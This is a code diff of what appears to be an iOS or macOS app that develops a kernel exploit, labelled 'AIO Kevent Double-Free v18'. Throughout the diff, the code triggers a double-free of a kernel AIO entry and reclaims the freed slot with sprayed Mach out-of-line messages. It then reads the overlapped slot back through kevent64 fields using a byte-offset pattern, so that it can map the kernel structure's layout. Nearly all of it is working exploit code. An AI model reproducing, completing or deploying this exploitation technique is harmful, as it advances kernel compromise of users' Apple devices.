@@ -5681,7 +5681,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v17 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v18 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5950,10 +5950,9 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     enum { kDrainOolSize = 256 };
     uint8_t *drainPayload = (uint8_t *)calloc(1, kDrainOolSize);
     if (drainPayload) {
-        // All zeros — clean entry state (no error, buf=0, fd=0, procp=0)
-        // If aio_error returns 0 after overlap, the kernel reads these
-        // fields directly from the kalloc slot (not cached from completion).
-        memset(drainPayload, 0, kDrainOolSize);
+        // Byte-offset pattern: payload[i]=i — kevent64 ext[0],ext[1] reveal
+        // exact byte offsets of errorval and returnval in AIO entry struct.
+        for (int i = 0; i < kDrainOolSize; i++) drainPayload[i] = (uint8_t)i;
     }
 
     typedef struct {
@@ -5988,39 +5987,26 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     // Now the magazine should be depleted. The double-freed slot should be near
     // the freelist head. Allocate E1 (AIO), then spray one more OOL → overlap?
     {
-        static struct aiocb e1;
-        static char e1buf[4096];
-        memset(&e1, 0, sizeof(e1));
-        e1.aio_fildes = fd;
-        e1.aio_buf = e1buf;
-        e1.aio_nbytes = 0x4444;  // signature nbytes
-        e1.aio_offset = 0;
-        e1.aio_sigevent.sigev_notify = SIGEV_NONE;
-
-        int e1ok = (aio_read(&e1) == 0);
-        [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
-
-        if (e1ok && drainPayload && drainPortsReady > 0 && overlapSend != MACH_PORT_NULL) {
-            // Dedicated overlap port: only 1 drain msg sent → queue has room for overlap
-            [self appendLog:@"  D: sending drain msg to overlap port..."];
-            {
-                DrainMsg preMsg;
-                memset(&preMsg, 0, sizeof(preMsg));
-                preMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-                preMsg.header.msgh_size = sizeof(DrainMsg);
-                preMsg.header.msgh_remote_port = overlapSend;
-                preMsg.header.msgh_id = 8888;
-                preMsg.body.msgh_descriptor_count = 1;
-                preMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-                preMsg.ool.address = drainPayload;
-                preMsg.ool.size = kDrainOolSize;
-                preMsg.ool.deallocate = FALSE;
-                preMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
-                kern_return_t pkr = mach_msg(&preMsg.header, MACH_SEND_MSG, sizeof(preMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-                [self appendLog:[NSString stringWithFormat:@"  D: pre-drain send kr=%d", pkr]];
-            }
-
-            [self appendLog:@"  D: sending overlap OOL (dedicated port, 1+1=2 < qlimit=5)..."];
+        int e2kq = kqueue();
+        static struct aiocb e2;
+        static char e2buf[4096];
+        memset(&e2, 0, sizeof(e2));
+        e2.aio_fildes = fd;
+        e2.aio_buf = e2buf;
+        e2.aio_nbytes = sizeof(e2buf);
+        e2.aio_offset = 0;
+        e2.aio_lio_opcode = LIO_READ;
+        e2.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+        e2.aio_sigevent.sigev_signo = e2kq;
+        e2.aio_sigevent.sigev_value.sival_ptr = (void *)0xBB;
+        int e2ok = (aio_read(&e2) == 0);
+        [self appendLog:[NSString stringWithFormat:@"  E2 aio_read: %@", e2ok ? @"OK" : @"FAIL"]];
+        if (e2ok && drainPayload && drainPortsReady > 0 && overlapSend != MACH_PORT_NULL) {
+            // Wait for E2 to complete BEFORE overlap
+            while (aio_error(&e2) == EINPROGRESS) usleep(100);
+            [self appendLog:[NSString stringWithFormat:@"  E2 done, aio_error=%d", aio_error(&e2)]];
+            // Send overlap OOL to reclaim the double-freed slot (which E2 may hold)
+            [self appendLog:@"  D: sending overlap OOL..."];
             DrainMsg overlapMsg;
             memset(&overlapMsg, 0, sizeof(overlapMsg));
             overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -6037,43 +6023,35 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                      0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
             [self appendLog:[NSString stringWithFormat:@"  D: overlap send kr=%d", okr]];
 
-            [self appendLog:@"  D: checking E1 state..."];
-            while (aio_error(&e1) == EINPROGRESS) usleep(100);
-            int e1state = aio_error(&e1);
-            [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL, %d=EFAULT)", e1state, EINVAL, EFAULT]];
-
-            if (e1state == EINVAL) {
-                [self appendLog:@"  *** OVERLAP CONFIRMED: OOL overwrote E1's slot ***"];
-                [self appendLog:@"  *** Freelist corruption active — overlapping alloc works ***"];
-            } else if (e1state == EFAULT) {
-                [self appendLog:@"  *** E1 EFAULT — OOL corrupted E1's buf/fd fields ***"];
-                [self appendLog:@"  *** Overlap confirmed — now reading slot contents ***"];
-
-                // ---- Phase E: Read slot via AIO side-channel ----
-                // Mach recv doesn't work (extract_right kills recv). Instead, map
-                // AIO entry layout by reading aio_error/returnval with pattern OOL.
-                // payload[i]=i, so returned bytes directly reveal field offsets.
-                [self appendLog:@"\n--- Phase E: AIO side-channel field map ---"];
-                int e1err = aio_error(&e1);
-                ssize_t e1ret = aio_return(&e1);
-                [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0x%08x)", e1err, e1err]];
-                [self appendLog:[NSString stringWithFormat:@"  E1 aio_return=%lld (0x%016llx)", (long long)e1ret, (unsigned long long)e1ret]];
-                // If aio_error returns EFAULT (14), errorval may be elsewhere or
-                // aio_error does additional validation on corrupted flags.
-                // aio_return should read returnval directly — its value tells us
-                // which OOL bytes landed at the returnval offset.
-            } else if (e1state == 0) {
-                [self appendLog:@"  E1 valid — OOL did not hit same slot (magazine drain insufficient)"];
-                aio_return(&e1);
+            // ---- Phase E: kevent64 read of overlapped E2 slot ----
+            // filt_aioprocess reads errorval→ext[0], returnval→ext[1] from
+            // the OOL payload. procp=0 → TAILQ_REMOVE skipped. Safe.
+            [self appendLog:@"\n--- Phase E: kevent64 read of overlapped slot ---"];
+            struct kevent64_s kev = {};
+            struct timespec ts = {5, 0};
+            int nev = kevent64(e2kq, NULL, 0, &kev, 1, 0, &ts);
+            if (nev > 0) {
+                [self appendLog:[NSString stringWithFormat:@"  E: kevent64 returned event"]];
+                [self appendLog:[NSString stringWithFormat:@"  E: ident  = 0x%llx", kev.ident]];
+                [self appendLog:[NSString stringWithFormat:@"  E: data   = 0x%llx", (uint64_t)kev.data]];
+                [self appendLog:[NSString stringWithFormat:@"  E: udata  = 0x%llx", kev.udata]];
+                [self appendLog:[NSString stringWithFormat:@"  E: ext[0] = 0x%llx (errorval from OOL)", kev.ext[0]]];
+                [self appendLog:[NSString stringWithFormat:@"  E: ext[1] = 0x%llx (returnval from OOL)", kev.ext[1]]];
+            } else if (nev == 0) {
+                [self appendLog:@"  E: kevent64 timeout — knote gone"];
+                ssize_t rv = aio_return(&e2);
+                [self appendLog:[NSString stringWithFormat:@"  E: aio_return fallback = %lld", (long long)rv]];
             } else {
-                [self appendLog:[NSString stringWithFormat:@"  E1 unexpected state: %d", e1state]];
-                if (e1state != EINVAL && e1state != EFAULT) aio_return(&e1);
+                [self appendLog:[NSString stringWithFormat:@"  E: kevent64 error nev=%d errno=%d", nev, errno]];
             }
+            close(e2kq);
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  D: SKIP — e1ok=%d payload=%p ports=%d", e1ok, drainPayload, drainPortsReady]];
-            if (e1ok) {
-                while (aio_error(&e1) == EINPROGRESS) usleep(100);
-                if (aio_error(&e1) == 0) aio_return(&e1);
+            [self appendLog:[NSString stringWithFormat:@"  D: SKIP — e2ok=%d payload=%p ports=%d", e2ok, drainPayload, drainPortsReady]];
+            if (e2ok) {
+                while (aio_error(&e2) == EINPROGRESS) usleep(100);
+                aio_return(&e2);
+            }
+            close(e2kq);
             }
         }
     }
